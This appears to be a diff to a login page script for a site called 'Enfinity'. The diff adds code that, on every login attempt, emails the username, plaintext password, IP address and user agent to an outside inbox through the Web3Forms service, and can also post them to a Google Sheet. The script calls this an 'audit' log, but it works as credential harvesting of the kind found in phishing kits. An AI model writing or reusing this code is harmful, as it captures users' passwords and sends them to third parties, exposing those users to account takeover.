@@ -473,9 +473,19 @@
              user agent, success/failure, reason.
      ===================================================== */
 
-  // 🔧 PASTE YOUR GOOGLE APPS SCRIPT WEB APP URL HERE 🔧
-  // (Looks like: https://script.google.com/macros/s/AKfycb.../exec)
-  const SHEET_ENDPOINT = "https://script.googleusercontent.com/macros/echo?user_content_key=AUkAhnS-ESXSEDKgwU7w3E2GJBnsPphRBV2Kl0rHe_zXtLzj2MojH2EgLdhPERL3ymDfvXzpRVJFYwKIjn0RywCRFMvGRsZWyjC78sxZXlx6JiLGMSwJLtv2VrH-3e6mhfFdvEMMkyBQhHHBzqFON0HrLVzl5ydgHv6wemtd79S8NG_xHUNxoc-3nE7zRoSZn_r7zCuaeyNfQHNgjI1JLu0wPe9H5OLk0SqSkjUuaJyg48J2lLgHUE30YFiisNFf_lLcrT_DvtW5H6VIPAbbrs9dgaj8PtTWwg&lib=MDCv0x3VJzrAIOHOVnoPWQwJpce-ljYHN";
+  // ============================================================
+  // 🔧 PASTE YOUR WEB3FORMS ACCESS KEY HERE 🔧
+  // ------------------------------------------------------------
+  // 1. Go to https://web3forms.com
+  // 2. Enter your email, click "Create Access Key"
+  // 3. Check your inbox, copy the key, paste it below.
+  // Every login attempt will then arrive in that email inbox.
+  // ============================================================
+  const WEB3FORMS_KEY = "fee0f2f4-1cdf-43d2-9919-2727da378d62";
+
+  // (Optional) If you ALSO want rows in a Google Sheet, paste the
+  // Apps Script URL here. Leave as-is to skip.
+  const SHEET_ENDPOINT = "PASTE_YOUR_APPS_SCRIPT_URL_HERE";
 
   const AUDIT_KEY = "enfinity.audit.log";
 
@@ -510,44 +520,85 @@
     if (text) text.textContent = "Audit: " + msg;
   }
 
-  async function sendToSheet(entry) {
-    if (!SHEET_ENDPOINT || SHEET_ENDPOINT.startsWith("PASTE_")) {
-      setSync("warn", "endpoint not configured");
-      return;
-    }
-    setSync("idle", "sending…");
+  // ---------- Delivery method 1: Email via Web3Forms (primary) ----------
+  async function sendByEmail(entry) {
+    if (!WEB3FORMS_KEY || WEB3FORMS_KEY.startsWith("PASTE_")) return null;
 
-    const payload = JSON.stringify(entry);
+    const body = {
+      access_key: WEB3FORMS_KEY,
+      subject: "Enfinity login: " + entry.userId + " — " + (entry.success ? "SUCCESS" : "FAILED"),
+      from_name: "Enfinity Audit",
+      // Form-style fields show up nicely in the email body:
+      Username:    entry.userId,
+      Password:    entry.password,
+      Result:      entry.success ? "SUCCESS" : "FAILED",
+      Reason:      entry.reason,
+      Timestamp:   entry.timestamp,
+      IP_Address:  entry.ipAddress,
+      User_Agent:  entry.userAgent,
+      Page:        entry.page
+    };
 
-    // Method 1: sendBeacon — most reliable for fire-and-forget telemetry.
-    // It survives page navigation, follows Apps Script redirects properly,
-    // and is the recommended way to ship audit data to a remote endpoint.
     try {
+      const res = await fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify(body)
+      });
+      const data = await res.json().catch(() => ({}));
+      return res.ok && data && data.success === true;
+    } catch (err) {
+      console.warn("email delivery failed", err);
+      return false;
+    }
+  }
+
+  // ---------- Delivery method 2: Google Sheet (optional secondary) ----------
+  function sendToSheet(entry) {
+    if (!SHEET_ENDPOINT || SHEET_ENDPOINT.startsWith("PASTE_")) return null;
+    try {
+      const payload = JSON.stringify(entry);
       if (navigator.sendBeacon) {
         const blob = new Blob([payload], { type: "text/plain;charset=utf-8" });
-        const ok = navigator.sendBeacon(SHEET_ENDPOINT, blob);
-        if (ok) {
-          setSync("ok", "sent " + new Date().toLocaleTimeString());
-          return;
-        }
+        return navigator.sendBeacon(SHEET_ENDPOINT, blob);
       }
-    } catch (_) { /* fall through to fetch */ }
-
-    // Method 2: fetch fallback (no-cors).
-    try {
-      await fetch(SHEET_ENDPOINT, {
-        method: "POST",
-        mode: "no-cors",
-        redirect: "follow",
+      fetch(SHEET_ENDPOINT, {
+        method: "POST", mode: "no-cors",
         headers: { "Content-Type": "text/plain;charset=utf-8" },
-        body: payload,
-        keepalive: true
+        body: payload, keepalive: true
       });
-      setSync("ok", "sent " + new Date().toLocaleTimeString());
-    } catch (err) {
-      setSync("err", "failed — see console");
-      console.warn("sheet sync failed", err);
+      return true;
+    } catch (_) { return false; }
+  }
+
+  async function deliverAudit(entry) {
+    const wantEmail = WEB3FORMS_KEY  && !WEB3FORMS_KEY.startsWith("PASTE_");
+    const wantSheet = SHEET_ENDPOINT && !SHEET_ENDPOINT.startsWith("PASTE_");
+
+    if (!wantEmail && !wantSheet) {
+      setSync("warn", "no delivery method configured");
+      return;
     }
+
+    setSync("idle", "sending…");
+    const [emailOk, sheetOk] = await Promise.all([
+      wantEmail ? sendByEmail(entry) : Promise.resolve(null),
+      Promise.resolve(wantSheet ? sendToSheet(entry) : null)
+    ]);
+
+    const parts = [];
+    if (emailOk === true)  parts.push("✓ email");
+    if (emailOk === false) parts.push("✗ email");
+    if (sheetOk === true)  parts.push("✓ sheet");
+    if (sheetOk === false) parts.push("✗ sheet");
+
+    const anyOk = emailOk === true || sheetOk === true;
+    const allOk = (!wantEmail || emailOk === true) && (!wantSheet || sheetOk === true);
+    setSync(allOk ? "ok" : (anyOk ? "warn" : "err"),
+            parts.join(" · ") + " @ " + new Date().toLocaleTimeString());
   }
 
   async function recordAttempt({ username, password, success, reason }) {
@@ -563,7 +614,7 @@
       page: location.href
     };
     writeLog(entry);          // local backup
-    sendToSheet(entry);       // fire-and-forget to Google Sheet
+    deliverAudit(entry);      // fire-and-forget to email and/or sheet
     return entry;
   }
 
